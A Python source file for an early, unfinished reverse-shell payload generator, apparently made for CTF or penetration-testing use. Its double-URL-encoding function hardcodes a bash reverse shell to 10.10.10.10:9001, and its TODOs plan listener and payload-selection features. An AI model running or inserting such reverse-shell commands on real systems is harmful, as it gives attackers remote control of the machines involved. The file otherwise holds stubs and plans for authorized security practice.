import fileinput
import os
from sys import argv
import urllib.parse

#########################################################

print('''
 .----------------. .----------------. .----------------. .----------------. .----------------. 
| .--------------. | .--------------. | .--------------. | .--------------. | .--------------. |
| |     ____     | | |   _____      | | |   _____      | | |     _____    | | |  _________   | |
| |   .'    `.   | | |  |_   _|     | | |  |_   _|     | | |    |_   _|   | | | |_   ___  |  | |
| |  /  .--.  \  | | |    | |       | | |    | |       | | |      | |     | | |   | |_  \_|  | |
| |  | |    | |  | | |    | |   _   | | |    | |   _   | | |      | |     | | |   |  _|  _   | |
| |  \  `--'  /  | | |   _| |__/ |  | | |   _| |__/ |  | | |     _| |_    | | |  _| |___/ |  | |
| |   `.____.'   | | |  |________|  | | |  |________|  | | |    |_____|   | | | |_________|  | |
| |              | | |              | | |              | | |              | | |              | |
| '--------------' | '--------------' | '--------------' | '--------------' | '--------------' |
 '----------------' '----------------' '----------------' '----------------' '----------------' 
                                                                                    @0dayCTF, @VainXploits
                                                                                      Twitter: https://twitter.com/0dayCTF
                                                                                      Twitter: https://twitter.com/VainXploits
                                                                                    
''')
#######################NOTES-STR#######################
# IP_var = input("Receiving IP: ")
# PORT_var = input("Receiving PORT: ")
# IP = print(open('file.txt', 'r').read().replace('IP', IP_var) ) # ----> Really Really important.
# print(open('file.txt', 'r').read().replace(IP + 'PORT', PORT_var))
#######################NOTES-END#######################

def display_payload_options():
  f = open('demo.txt', 'r')
  file_contents = f.read()
  print(file_contents)
  f.close()

def yet_to_decide():
  # open the sample file used
  file = open('assets/payloads.txt')
  # read the content of the file opened
  content = file.readlines()
  # read nth line from the file
  print(content[0])

#yet_to_decide()

# display_payload_options()

# This function is for urlencoding the payloads.
def url_encode():
  alpha = urllib.parse.quote("String I want in here(the shells that want to be URL encoded by the user.)", safe='')
  print(alpha)

# This function is for double urlencoding the payloads.
def double_url_encode():
  bravo = urllib.parse.quote("sh -i >& /dev/tcp/10.10.10.10/9001 0>&1", safe='')
  charlie = urllib.parse.quote(bravo, safe='')
  print(charlie)

# TODO: Work on printing the stuff from display_payload_options() function in a grid format. Ref: https://stackoverflow.com/questions/32460832/print-a-list-of-strings-in-a-grid-format-python
# TODO: Decide on a name for the yet_to_decide() function.
# TODO: Do the manual labour of putting all the payloads into a txt file.
# TODO: Work on functions for encoding options & shell options. UPDATE 1: DONE WITH SINGLE URL ENCODING. UPDATE 2: DONE WITH DOUBLE URL ENCODING.
# TODO: Work on listener options.
# TODO: Work on how I can do most of this from single command in the terminal instead of throwing the user a whole bunch of fucking prompts once they run the tool.
# TODO: ^^ Includes how to select Reverse, Bind or MSF and how to select a particular payload they want(inside the sections in the revhsells website).
